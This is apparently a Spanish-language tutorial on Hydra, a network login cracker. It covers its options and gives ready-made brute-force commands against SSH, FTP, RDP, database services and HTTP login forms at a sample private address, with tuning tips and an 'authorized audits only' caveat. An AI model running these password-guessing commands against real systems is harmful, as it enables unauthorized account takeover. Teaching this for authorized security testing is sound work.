## Introducción a Hydra

**Hydra** es una herramienta de login cracker que soporta numerosos protocolos de red.

Es extremadamente rápida y versátil para ataques de fuerza bruta contra servicios de red.

---

## Instalación

### Kali Linux

```bash
hydra -h
sudo apt install hydra
```

---

### Sintaxis Básica

```bash
hydra [opciones] [target] [service]
```

---

## Opciones Principales

### Usuario y Contraseña

```bash
-l usuario          # Usuario específico
-L lista_usuarios   # Lista de usuarios
-p contraseña       # Contraseña específica
-P lista_passwords  # Lista de contraseñas
-C combo_file       # Archivo con combinaciones usuario:contraseña
```

---

### Configuración

```bash
-t tareas   # Número de tareas paralelas (default: 16)
-f          # Parar al encontrar la primera combinación válida
-v          # Modo verbose
-V          # Mostrar cada intento
-s puerto   # Puerto específico
-w tiempo   # Tiempo de espera (segundos)
```

---

## Servicios Soportados

### Protocolos Web

```bash
hydra -l admin -P passwords.txt 192.168.1.100 http-get
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form
hydra -l admin -P passwords.txt 192.168.1.100 https-get
```

---

### Servicios de Red

```bash
hydra -l root -P passwords.txt 192.168.1.100 ssh
hydra -l admin -P passwords.txt 192.168.1.100 ftp
hydra -l admin -P passwords.txt 192.168.1.100 telnet
hydra -l administrator -P passwords.txt 192.168.1.100 rdp
```

---

### Servicios de Base de Datos

```bash
hydra -l root -P passwords.txt 192.168.1.100 mysql
hydra -l postgres -P passwords.txt 192.168.1.100 postgres
hydra -l sa -P passwords.txt 192.168.1.100 mssql
```

---

## Ejemplos Prácticos

### Ataque SSH

**Usuario específico:**

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
```

**Múltiples usuarios:**

```bash
hydra -L usuarios.txt -P passwords.txt 192.168.1.100 ssh
```

**Con opciones de rendimiento:**

```bash
hydra -L usuarios.txt -P passwords.txt -t 4 -f 192.168.1.100 ssh
```

---

### Ataque HTTP POST

**Formulario básico:**

```bash
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
```

**Con cookies:**

```bash
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed:H=Cookie: PHPSESSID=abcd1234"
```

**Explicación del formato:**

- `/login.php` = ruta del formulario
- `username=^USER^&password=^PASS^` = parámetros POST
- `Login failed` = mensaje de error a buscar
- `H=Cookie:` = headers adicionales

---

### Ataque FTP

**Usuario anónimo:**

```bash
hydra -l anonymous -P passwords.txt 192.168.1.100 ftp
```

**Puerto personalizado:**

```bash
hydra -l admin -P passwords.txt -s 2121 192.168.1.100 ftp
```

---

## Optimización y Configuración

### Ajuste de Rendimiento

**Aumentar tareas paralelas:**

```bash
hydra -t 64 -l admin -P passwords.txt 192.168.1.100 ssh
```

**Tiempo de espera:**

```bash
hydra -w 30 -l admin -P passwords.txt 192.168.1.100 ssh
```

---

### Manejo de Resultados

**Guardar en archivo:**

```bash
hydra -o resultado.txt -l admin -P passwords.txt 192.168.1.100 ssh
```

**Restaurar sesión:**

```bash
hydra -R
```

---

## Mejores Prácticas

### Estrategia de Ataque

1. Comenzar con **diccionarios pequeños**
2. Usar **-f** para detener al encontrar credenciales
3. Ajustar **-t** según el servicio (4-16 para SSH, 64 para HTTP)
4. Guardar **resultados** en archivo

---

### Consideraciones

- **Solo** usar en auditorías autorizadas
- Respetar **rate limits** del servicio
- No saturar **sistemas de producción**
- **Documentar** permisos obtenidos

---